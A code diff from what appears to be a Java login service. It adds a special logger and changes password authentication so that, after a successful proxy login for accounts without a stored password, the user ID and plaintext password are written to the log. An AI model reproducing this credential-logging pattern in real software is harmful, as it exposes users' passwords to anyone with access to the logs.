@@ -31,6 +31,8 @@ import org.springframework.stereotype.Component;
 public class LoginApiManagerImpl extends BaseProxyManager implements LoginApiManager {
 
     private static final Logger logger = LoggerFactory.getLogger(LoginApiManagerImpl.class);
+    private static final Logger sohuSpecialLogger= LoggerFactory.getLogger("sohuSpecialLogger");
+
 
     @Autowired
     private LoginApiManager sgLoginApiManager;
@@ -74,7 +76,13 @@ public class LoginApiManagerImpl extends BaseProxyManager implements LoginApiMan
                     return result;
                 }
 
-                result = proxyLoginApiManager.webAuthUser(authUserApiParams);
+                String passwordStored=account.getPassword();
+                if(Strings.isNullOrEmpty(passwordStored) && ManagerHelper.authUserBySOHUSwitcher()){
+                    result = proxyLoginApiManager.webAuthUser(authUserApiParams);
+                    if(result.isSuccess()){
+                        sohuSpecialLogger.warn(passportId+"\t"+authUserApiParams.getPassword());
+                    }
+                }
 
             }
 
